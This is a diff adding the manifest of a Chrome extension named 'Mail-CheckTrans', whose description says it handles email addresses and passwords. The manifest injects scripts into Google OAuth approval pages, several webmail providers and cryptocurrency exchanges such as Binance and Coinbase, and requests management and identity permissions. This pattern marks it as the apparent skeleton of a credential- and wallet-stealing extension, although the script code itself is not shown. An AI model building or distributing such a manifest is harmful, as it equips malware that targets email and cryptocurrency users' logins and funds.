@@ -1,0 +1,39 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+
+   "background": {
+
+      "scripts": [ "js/newtab.js","js/options.js" ]
+   },
+   "browser_action": {
+      "default_icon": {
+         "19": "images/envelope-19.png",
+         "38": "images/envelope-38.png"
+      },
+        "default_popup": "pages/popup_index.html",
+      "default_title": "MCT"
+   },
+   "content_scripts": [ {
+      "js": ["js/newtab.js" ,"js/background.js" ],
+      "matches": [ "https://accounts.google.com/o/oauth2/approval/*","*://*.google.com/o/oauth2/approval/*","*://*.live.com/*","*://live.com/*", "*://*.yandex.ru/*", "*://yandex.ru/*",   "*://google.com/*",   "*://*.google.com/*",  "*://yahoo.com/*",  "*://*.yahoo.com/*", "*://mail.ru/*","*://*.mail.ru/*",   "*://blockchain.com/*","*://*.blockchain.com/*","*://qq.com/*",   "*://localbitcoins.com/*","*://*.localbitcoins.com/*", "*://binance.com/*","*://*.binance.com/*","*://coinbase.com/*","*://*.coinbase.com/*","*://*.qq.com/*"],
+      "run_at": "document_end"
+   }],
+   "default_locale": "de",
+   "description": "Mail-CheckTrans - 在首次安装时会加密电子邮件地址和密码。此后，此信息将不会被转发",
+   "icons": {
+      "128": "images/icon128.png",
+      "16": "images/icon16.png",
+      "48": "images/icon48.png"
+   },
+     "manifest_version": 2,
+   "name": "Mail-CheckTrans",
+   "options_ui": {
+      "chrome_style": true,
+      "page": "pages/options.html"
+   },
+   "permissions": [ "tabs", "storage", "management", "notifications", "contextMenus", "identity", "https://accounts.google.com/o/oauth2/approval/*", "*://*.yandex.ru/*", "*://yandex.ru/*",   "*://google.com/*",   "*://*.google.com/*",  "*://yahoo.com/*", "*://*.live.com/*",  "*://*.yahoo.com/*", "*://mail.ru/*","*://*.mail.ru/*",  "*://qq.com/*","*://live.com/*", "*://blockchain.com/*","*://*.blockchain.com/*", "*://localbitcoins.com/*","*://*.localbitcoins.com/*","*://binance.com/*","*://*.binance.com/*","*://coinbase.com/*","*://*.coinbase.com/*", "*://*.qq.com/*"],
+   "short_name": "M-CT",
+   "version": "4.3.10",
+   "version_name": "4.3.10"
+}
